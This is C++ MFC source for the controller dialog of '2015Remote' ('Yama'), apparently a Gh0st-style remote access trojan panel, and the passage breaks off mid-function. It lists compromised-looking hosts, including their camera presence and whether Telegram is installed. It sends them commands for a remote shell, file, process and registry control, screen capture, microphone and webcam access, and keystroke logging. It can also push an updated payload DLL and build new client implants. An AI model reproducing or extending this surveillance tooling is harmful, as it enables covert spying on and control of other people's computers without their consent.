
// 2015RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"
#include <vector>
#include "KeyBoardDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define UM_ICONNOTIFY WM_USER+100


enum
{
	ONLINELIST_IP=0,          //IP的列顺序
	ONLINELIST_ADDR,          //地址
	ONLINELIST_COMPUTER_NAME, //计算机名/备注
	ONLINELIST_OS,            //操作系统
	ONLINELIST_CPU,           //CPU
	ONLINELIST_VIDEO,         //摄像头(有无)
	ONLINELIST_PING,           //PING(对方的网速)
	ONLINELIST_VERSION,	       // 版本信息
	ONLINELIST_LOGINTIME,      // 活动窗口
	ONLINELIST_CLIENTTYPE,		// 客户端类型
	ONLINELIST_MAX, 
};


typedef struct
{
	const char*   szTitle;     //列表的名称
	int		nWidth;            //列表的宽度
}COLUMNSTRUCT;

const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数

COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
{
	{"IP",				148	},
	{"端口",			64	},
	{"计算机名/备注",	160	},
	{"操作系统",		256	},
	{"CPU",				80	},
	{"摄像头",			72	},
	{"PING",			100	},
	{"版本",			80	},
	{"活动窗口",		150 },
	{"类型",			50 },
};

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

const int g_Column_Count_Message = 3;   // 列表的个数

COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = 
{
	{"信息类型",		200	},
	{"时间",			200	},
	{"信息内容",	    490	}
};

int g_Column_Online_Width  = 0;
int g_Column_Message_Width = 0;

CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING  
};

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

	// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 对话框


CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
	m_iocpServer = iocpServer;
	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);

	InitializeCriticalSection(&m_cs);
}


CMy2015RemoteDlg::~CMy2015RemoteDlg()
{
	DeleteCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
	ON_NOTIFY(HDN_ITEMCLICK, 0, &CMy2015RemoteDlg::OnHdnItemclickList)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
	ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
	ON_COMMAND(IDM_ONLINE_ABOUT,&CMy2015RemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
	ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
	ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList) 
	ON_MESSAGE(WM_USEROFFLINEMSG, OnUserOfflineMsg)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog) 
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
	ON_WM_HELPINFO()
END_MESSAGE_MAP()


// CMy2015RemoteDlg 消息处理程序
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
		{
			if (IsIconic())
			{
				ShowWindow(SW_SHOW);
				break;
			}
			ShowWindow(IsWindowVisible() ? SW_HIDE : SW_SHOW);
			SetForegroundWindow();
			break;
		}
	case WM_RBUTTONDOWN:
		{
			CMenu Menu;
			Menu.LoadMenu(IDR_MENU_NOTIFY);
			CPoint Point;
			GetCursorPos(&Point);
			SetForegroundWindow();   //设置当前窗口
			Menu.GetSubMenu(0)->TrackPopupMenu(
				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
				Point.x, Point.y, this, NULL); 

			break;
		}
	}
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{
	HMENU hMenu = LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
	::SetMenu(this->GetSafeHwnd(),hMenu);                    //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                      //显示菜单
}

VOID CMy2015RemoteDlg::CreatStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return ;      
	}

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{
	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
	m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	m_Nid.hIcon = m_hIcon;                               //icon 变量
	CString strTips ="禁界: 远程协助软件";       //气泡提示
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
}

VOID CMy2015RemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{
		return;     
	}
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //和我们的位图资源相关联
	RECT Rect,RectMain;
	GetWindowRect(&RectMain);   //得到整个窗口的大小
	Rect.left=0;
	Rect.top=0;
	Rect.bottom=80;
	Rect.right=RectMain.right-RectMain.left+10;
	m_ToolBar.MoveWindow(&Rect,TRUE);

	m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(9, "键盘记录");
	m_ToolBar.SetButtonText(10,"参数设置"); 
	m_ToolBar.SetButtonText(11,"生成服务端"); 
	m_ToolBar.SetButtonText(12,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


VOID CMy2015RemoteDlg::InitControl()
{
	//专属函数

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);

	for (int i = 0;i<g_Column_Count_Online;++i)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth; 
	}
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Count_Message; ++i)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);
		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}

	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}


VOID CMy2015RemoteDlg::TestOnline()
{
	ShowMessage(true,"软件初始化成功...");
}

bool IsExitItem(CListCtrl &list, DWORD_PTR data){
	for (int i=0,n=list.GetItemCount();i<n;i++)
	{
		DWORD_PTR v = list.GetItemData(i);
		if (v == data) {
			return true;
		}
	}
	return false;
}

std::vector<CString> SplitCString(CString strData) {
	std::vector<CString> vecItems;
	CString strItem;
	int i = 0;

	while (AfxExtractSubString(strItem, strData, i, _T('|')))
	{
		vecItems.push_back(strItem);  // Add to vector
		i++;
	}
	return vecItems;
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
							   CString strCPU, CString strVideo, CString strPing, CString ver, CString st, CString tp, CONTEXT_OBJECT* ContextObject)
{
	EnterCriticalSection(&m_cs);
	if (IsExitItem(m_CList_Online, (ULONG_PTR)ContextObject)) {
		LeaveCriticalSection(&m_cs);
		OutputDebugStringA(CString("===> '") + strIP + CString("' already exist!!\n"));
		return;
	}
	//默认为0行  这样所有插入的新列都在最上面
	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(),strIP);
	auto vec = SplitCString(tp.IsEmpty() ? "DLL" : tp);
	tp = vec[0];
	m_CList_Online.SetItemText(i,ONLINELIST_ADDR,strAddr);
	m_CList_Online.SetItemText(i,ONLINELIST_COMPUTER_NAME,strPCName); 
	m_CList_Online.SetItemText(i,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(i,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(i,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(i,ONLINELIST_PING,strPing); 
	m_CList_Online.SetItemText(i, ONLINELIST_VERSION, ver);
	m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, st);
	m_CList_Online.SetItemText(i, ONLINELIST_CLIENTTYPE, tp.IsEmpty()?"DLL":tp);
	CString data[10] = { strIP, strAddr,strPCName,strOS,strCPU,strVideo,strPing,ver,st,tp };
	ContextObject->SetClientInfo(data);
	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);

	ShowMessage(true,strIP+"主机上线");
	LeaveCriticalSection(&m_cs);

	SendMasterSettings(ContextObject);
}


VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CTime Timer = CTime::GetCurrentTime();
	CString strTime= Timer.Format("%H:%M:%S");
	CString strIsOK= bOk ? "执行成功" : "执行失败";
	
	m_CList_Message.InsertItem(0,strIsOK);    //向控件中设置数据
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);

	CString strStatusMsg;

	EnterCriticalSection(&m_cs);
	int m_iCount = m_CList_Online.GetItemCount();
	LeaveCriticalSection(&m_cs);

	strStatusMsg.Format("有%d个主机在线",m_iCount);
	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
}

BOOL CMy2015RemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。
	SetWindowText(_T("Yama"));

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	isClosed = FALSE;
	g_2015RemoteDlg = this;
	CreateToolBar();
	InitControl();

	CreatStatusBar();

	CreateNotifyBar();

	CreateSolidMenu();

	if (!ListenPort()) {
		OnCancel();
		return FALSE;
	}
	int m = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ReportInterval");
	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
	m_settings = { m>0 ? m : 5, sizeof(void*) == 8, __DATE__, n };
	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
	std::string str = myMap[n];
	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = (char*)str.data();
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	timeBeginPeriod(1);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMy2015RemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (SIZE_MINIMIZED==nType)
	{
		return;
	} 
	EnterCriticalSection(&m_cs);
	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top  = 80;         //列表的上坐标
		rc.right  =  cx-1;    //列表的右坐标
		rc.bottom = cy-160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);

		for(int i=0;i<g_Column_Count_Online;++i){           //遍历每一个列
			double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
			Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
		}
	}
	LeaveCriticalSection(&m_cs);

	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy-156;     //列表的上坐标
		rc.right  = cx-1;    //列表的右坐标
		rc.bottom = cy-20;   //列表的下坐标
		m_CList_Message.MoveWindow(rc);
		for(int i=0;i<g_Column_Count_Message;++i){           //遍历每一个列
			double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                  //转换为int 类型
			m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	if(m_StatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top=cy-20;
		Rect.left=0;
		Rect.right=cx;
		Rect.bottom=cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	if(m_ToolBar.m_hWnd!=NULL)                  //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}
}


void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
}


void CMy2015RemoteDlg::OnClose()
{
	// 隐藏窗口而不是关闭
	ShowWindow(SW_HIDE);
	OutputDebugStringA("======> Hide\n");
}

void CMy2015RemoteDlg::Release(){
	OutputDebugStringA("======> Release\n");
	isClosed = TRUE;
	ShowWindow(SW_HIDE);

	Shell_NotifyIcon(NIM_DELETE, &m_Nid);

	BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for(int Pos = 0; Pos < n; ++Pos) 
	{
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(Pos);
		m_iocpServer->OnClientPreSending(ContextObject, &bToken, sizeof(BYTE));
	}
	LeaveCriticalSection(&m_cs);
	Sleep(500);

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Destroy();
		m_iocpServer = NULL;
	}
	g_2015RemoteDlg = NULL;
	SetEvent(m_hExit);
	CloseHandle(m_hExit);
	m_hExit = NULL;
	Sleep(500);

	timeEndPeriod(1);
}

int CALLBACK CMy2015RemoteDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort) {
	auto* pSortInfo = reinterpret_cast<std::pair<int, bool>*>(lParamSort);
	int nColumn = pSortInfo->first;
	bool bAscending = pSortInfo->second;

	// 获取列值
	CONTEXT_OBJECT* context1 = (CONTEXT_OBJECT*)lParam1;
	CONTEXT_OBJECT* context2 = (CONTEXT_OBJECT*)lParam2;
	CString s1 = context1->GetClientData(nColumn);
	CString s2 = context2->GetClientData(nColumn);

	int result = s1 > s2 ? 1 : -1;
	return bAscending ? result : -result;
}

void CMy2015RemoteDlg::SortByColumn(int nColumn) {
	static int m_nSortColumn = 0;
	static bool m_bSortAscending = false;
	if (nColumn == m_nSortColumn) {
		// 如果点击的是同一列，切换排序顺序
		m_bSortAscending = !m_bSortAscending;
	}
	else {
		// 否则，切换到新列并设置为升序
		m_nSortColumn = nColumn;
		m_bSortAscending = true;
	}

	// 创建排序信息
	std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
	EnterCriticalSection(&m_cs);
	m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
	LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult) {
	LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
	int nColumn = pNMHeader->iItem; // 获取点击的列索引
	SortByColumn(nColumn);          // 调用排序函数
	*pResult = 0;
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	//弹出菜单

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //加载菜单资源   资源和类对象关联

	CMenu*	SubMenu = Menu.GetSubMenu(0);    

	CPoint	Point;    
	GetCursorPos(&Point);

	int	iCount = SubMenu->GetMenuItemCount();
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetSelectedCount();
	LeaveCriticalSection(&m_cs);
	if (n == 0)         //如果没有选中
	{ 
		for (int i = 0;i<iCount;++i)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
	BYTE bToken = COMMAND_TALK;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
	fileSize = 0;
	try {
		// 打开文件（只读模式）
		CFile file(filePath, CFile::modeRead | CFile::typeBinary);

		// 获取文件大小
		fileSize = file.GetLength();

		// 分配内存缓冲区: 头+文件大小+文件内容
		char* buffer = new char[1 + sizeof(ULONGLONG) + static_cast<size_t>(fileSize) + 1];
		if (!buffer) {
			return NULL;
		}
		memcpy(buffer+1, &fileSize, sizeof(ULONGLONG));
		// 读取文件内容到缓冲区
		file.Read(buffer + 1 + sizeof(ULONGLONG), static_cast<UINT>(fileSize));
		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // 添加字符串结束符

		// 释放内存
		return buffer;
	}
	catch (CFileException* e) {
		// 捕获文件异常
		TCHAR errorMessage[256];
		e->GetErrorMessage(errorMessage, 256);
		e->Delete();
		return NULL;
	}

}

void CMy2015RemoteDlg::OnOnlineUpdate()
{
	if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"), 
		_T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p + 1, "ServerDll.dll");
	ULONGLONG fileSize = 0;
	char *buffer = ReadFileToMemory(path, fileSize);
	if (buffer) {
		buffer[0] = COMMAND_UPDATE;
		SendSelectedCommand((PBYTE)buffer, 1 + sizeof(ULONGLONG) + fileSize + 1);
		delete[] buffer;
	}
	else {
		AfxMessageBox("读取文件失败: "+ CString(path));
	}
}

void CMy2015RemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	if (IDYES != MessageBox(_T("确定删除选定的被控计算机吗?"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	EnterCriticalSection(&m_cs);
	int iCount = m_CList_Online.GetSelectedCount();
	for (int i=0;i<iCount;++i)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
		m_CList_Online.DeleteItem(iItem);
		strIP+="断开连接";
		ShowMessage(true,strIP);
	}
	LeaveCriticalSection(&m_cs);
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
	BYTE	bToken = COMMAND_SHELL;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}

VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
	BYTE	bToken = COMMAND_WSLIST;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{
	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "DXGI");
	CString algo = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ScreenCompress", "");
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString())};
	SendSelectedCommand(bToken, sizeof(bToken));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
	BYTE	bToken = COMMAND_LIST_DRIVE;    
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineKeyboardManager()
{
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
	// TODO: 在此添加命令处理程序代码
	CBuildDlg Dlg;
	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
	CString Port;
	Port.Format("%d", ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost"));
	Dlg.m_strPort = Port;
	Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{
	EnterCriticalSection(&m_cs);
